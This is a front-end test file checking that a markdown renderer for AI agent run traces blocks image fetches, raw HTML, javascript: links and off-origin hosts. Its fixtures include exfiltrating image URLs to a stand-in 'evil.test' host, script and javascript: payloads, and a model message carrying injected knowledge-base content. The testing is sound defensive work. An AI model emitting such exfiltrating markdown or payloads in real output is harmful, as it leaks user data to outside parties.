import { describe, expect, it } from "vitest";
import React from "react";
import "@testing-library/jest-dom";
import { render, screen } from "@testing-library/react";
import { SafeMarkdown, linkKind } from "./SafeMarkdown";
import { EventTimeline } from "@/components/runs/EventTimeline";
import { type RunEvent } from "@/lib/runs";

const EVIL = "![secret doc](https://evil.test/?d=leak) and ![](https://evil.test/blank.png) ![ref][r]\n\n[r]: https://evil.test/r.png";

function expectNoImageFetch(container: HTMLElement) {
  expect(container.querySelector("img")).toBeNull();
  expect(document.querySelector("link[rel=preload], link[rel=prefetch], source, picture, video, audio, iframe")).toBeNull();
  expect(container.innerHTML).not.toContain("evil.test");
}

describe("SafeMarkdown", () => {
  it("renders images as alt text only: no <img>, no preload, the URL nowhere", () => {
    const { container } = render(<SafeMarkdown>{EVIL}</SafeMarkdown>);
    expectNoImageFetch(container);
    expect(screen.getAllByTestId("markdown-image-alt").map((el) => el.textContent)).toEqual(["[image: secret doc]", "[image: ref]"]);
  });

  it("drops raw HTML, including an <img> tag", () => {
    const { container } = render(<SafeMarkdown>{'Hi <img src="https://evil.test/x.png"> <script>alert(1)</script> **bold**'}</SafeMarkdown>);
    expectNoImageFetch(container);
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("strong")).toHaveTextContent("bold");
  });

  it("opens external links in a new tab with no opener or referrer; strips javascript: URLs", () => {
    render(<SafeMarkdown>{"[ext](https://example.com/a) [bad](javascript:alert(1)) [app](/knowledge/kb-1)"}</SafeMarkdown>);
    const ext = screen.getByRole("link", { name: "ext" });
    expect(ext).toHaveAttribute("target", "_blank");
    expect(ext).toHaveAttribute("rel", "noopener noreferrer nofollow");
    expect(screen.queryByRole("link", { name: "bad" })).toBeNull();
    expect(screen.getByText("bad").closest("a")).toBeNull();
    expect(screen.getByRole("link", { name: "app" })).toHaveAttribute("href", "/knowledge/kb-1");
  });

  it("resolves hrefs against this origin: //host and \\host are dropped, another origin is external", () => {
    const origin = "https://studio.test";
    expect(linkKind("/knowledge/kb-1", origin)).toBe("internal");
    expect(linkKind("https://studio.test/agents", origin)).toBe("internal");
    expect(linkKind("#frag", origin)).toBe("internal");
    expect(linkKind("https://example.com/a", origin)).toBe("external");
    expect(linkKind("mailto:a@b.test", origin)).toBe("external");
    expect(linkKind("//evil.test/x", origin)).toBeNull();
    expect(linkKind("\\\\evil.test\\x", origin)).toBeNull();
    expect(linkKind("/\\evil.test", origin)).toBeNull();
    expect(linkKind(" //evil.test", origin)).toBeNull();
  });

  it("renders a //host link as plain text, a same-origin absolute link in the tab", () => {
    const here = window.location.origin;
    render(<SafeMarkdown>{`[proto](//evil.test/x) [self](${here}/agents)`}</SafeMarkdown>);
    expect(screen.queryByRole("link", { name: "proto" })).toBeNull();
    expect(screen.getByText("proto").closest("a")).toBeNull();
    const self = screen.getByRole("link", { name: "self" });
    expect(self).not.toHaveAttribute("target");
  });

  it("an in-app relative link stays in the tab", () => {
    render(<SafeMarkdown>{"[app](/knowledge/kb-1)"}</SafeMarkdown>);
    expect(screen.getByRole("link", { name: "app" })).not.toHaveAttribute("target");
  });

  it("a caller's img override is ignored", () => {
    const { container } = render(
      // A caller passing `img` anyway (the type forbids it): SafeMarkdown's own still wins.
      <SafeMarkdown components={{ img: () => React.createElement("img", { src: "https://evil.test/o.png", alt: "" }) } as never}>{EVIL}</SafeMarkdown>,
    );
    expectNoImageFetch(container);
  });
});

describe("EventTimeline model_message (trace Events tab)", () => {
  it("renders an image in model text as alt text, never an <img>", () => {
    const events: RunEvent[] = [{ seq: 1, type: "model_message", data: { text: `From the KB: ${EVIL}` }, ts: "2026-11-14T00:00:00Z" }];
    const { container } = render(<EventTimeline events={events} currentPartialText={{}} />);
    expectNoImageFetch(container);
    expect(screen.getByText("[image: secret doc]")).toBeInTheDocument();
  });
});
